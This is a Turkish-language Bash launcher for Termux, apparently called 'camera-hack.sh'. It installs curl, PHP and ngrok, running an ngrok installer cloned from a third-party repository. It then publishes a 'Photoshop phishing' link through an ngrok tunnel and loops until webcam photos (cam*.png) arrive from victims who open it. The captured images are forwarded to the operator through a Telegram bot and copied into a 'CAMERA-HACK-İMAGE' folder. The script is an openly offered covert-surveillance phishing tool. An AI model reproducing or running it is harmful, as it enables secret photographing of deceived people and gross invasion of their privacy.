#!/bin/bash

# CURL  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/curl ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi

# PHP  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/php ]];then
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install php -y
fi

# NGROK KONTROLÜ #

if [[ ! -a $PREFIX/bin/ngrok ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/termuxxtoolss/ngrok-kurulum
	cd ngrok-kurulum
	bash ngrok-kurulum.sh
	cd ..
	rm -rf ngrok-kurulum
fi

if [[ $1 == update ]];then
	cd files
	bash update.sh update $2
	exit
fi
# COMMANDS SCRİPT CONTROLS #

if [[ -a files/commands/termuxxtoolssmod ]];then
	mv files/commands/termuxxtoolssmod $PREFIX/bin
	mv files/commands/link-create $PREFIX/bin
	chmod 777 $PREFIX/bin/*
fi
control=$(ps aux | grep ngrok | grep -v grep |grep -o http)
if [[ -n $control ]];then
	killall ngrok
	killall php
fi
clear
cd files
bash update.sh
cd ..
if [[ -a updates_infos ]];then
	rm updates_infos
	exit
fi
cd files
bash banner.sh
function finish() {
	control=$(ps aux |grep ngrok |grep -v grep |grep -o http)
	if [[ -n $control ]];then
		killall ngrok
		killall php
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
dongu() {
control=$(ls |grep .png |wc -l)
while :
do
	control=$(ls |grep .png |wc -l)
	if [[ $control -gt 0 ]];then
		control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
		if [[ $control == telegram-bot ]];then
			echo "[✓] RESİMLER ALINDI\n\n\n[*] Biraz Sonra Resimler Gelecektir" > .info
			termuxxtoolssmod --send
			echo "sendPhoto .png" > .info
		else
			echo "[✓] RESİMLER ALINDI" > .info
		fi
		sleep 10
		killall ngrok
		killall php
		clear
		echo
		echo
		echo
		printf "\e[1;32m
		+-+-+-+-+-+-+-+-+-+-+\e[97m

		$(ls |grep .png |wc -l) ADET RESİM ALINDI\e[32m

		+-+-+-+-+-+-+-+-+-+-+"
		echo
		echo
		echo
		termuxxtoolssmod --send
		mv cam* images
		exit
	fi
done
}
bulunan() {
control=$(ls images |grep .png |wc -l)
if [[ $control -gt 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[33m $control\e[97m ADET RESİM BULUNDU"
	echo
	echo
	echo
	read -e -p $'\e[97mKAYDEDİLEN ESKİ RESİMLER SİLİNSİN Mİ ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' sec
	if [[ $sec == e || $sec == E ]];then
		rm images/cam*
		echo
		echo
		echo
		printf "\e[32m[✓]\e[97m SİLME İŞLEMİ TAMAMLANDI"
		echo
		echo
		echo
		read -e -p $'\e[97mDEVAM ETMEK İSTİYOR MUSUN ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' secim
		if [[ $secim == e || $secim == E ]];then
			sleep 1
		elif [[ $secim == h || $secim == H ]];then
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m İŞLEM İPTAL EDİLDİ"
			echo
			echo
			echo
			sleep 2
			cd ../..
			bash camera-hack.sh
			exit
		else
			echo
			echo
			echo
			printf "\e[31m[!]\e[97m HATALI SEÇİM"
			echo
			echo
			echo
			sleep 2
			cd ../..
			bash camera-hack.sh
			exit

		fi
	elif [[ $sec == h || $sec == H ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m SİLME İŞLEMİ İPTAL EDİLDİ"
		echo
		echo
		echo
		echo
		sleep 1
		link-create -p
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
		echo
		echo
		echo
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		dongu

	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m HATALI SEÇİM"
		echo
		echo
		echo
		sleep 2
		cd ../..
		bash camera-hack.sh
		exit
	fi
fi
}
image() {
	if [[ ! -a /sdcard/CAMERA-HACK-İMAGE ]];then
		mkdir /sdcard/CAMERA-HACK-İMAGE
	fi
	sayi=$(ls images |grep .png |wc -l)
	if [[ $sayi == 0 ]];then
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m KAYITLI RESİM BULUNAMADI"
		echo
		echo
		echo
		cd ../..
		sleep 2
		bash camera-hack.sh
		exit
	fi
	cp images/cam* /sdcard/CAMERA-HACK-İMAGE
}

printf "

\e[0m

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mPHOTOSHOP PHİSHİNG\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[33mRESİMLERİ DOSYALARA KOPYALA\e[97m

\e[31m[\e[97mA\e[31m]\e[97m ────────── \e[33mBİLDİRİM AYARLARI\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [[ $secim == 1 ]];then
	cd photoshop
	bulunan
	link-create -p
	echo
	echo
	echo
	printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
	echo
	echo
	echo
	printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
	echo
	echo
	echo
	dongu
elif [[ $secim == 2 ]];then
	cd photoshop
	image
	printf "\e[32m
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m
	
	TÜM RESİMLER DOSYALAR İÇİNDE \e[33m[ \e[97mDAHİLİ HAFIZA\e[33m ]\e[33m

	CAMERA-HACK-İMAGE\e[97m KLASÖRÜNE KAYDEDİLDİ
	\e[32m
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m\n\n\n"
	sleep 5
	cd ../..
	bash camera-hack.sh
elif [[ $secim == A || $secim == a ]];then
	termuxxtoolssmod
	sleep 1
	cd ..
	bash $0
	exit
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI\e[31m !!!\e[0m"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM\e[0m"
	echo
	echo
	echo
	sleep 2
	cd ..
	bash camera-hack.sh
fi
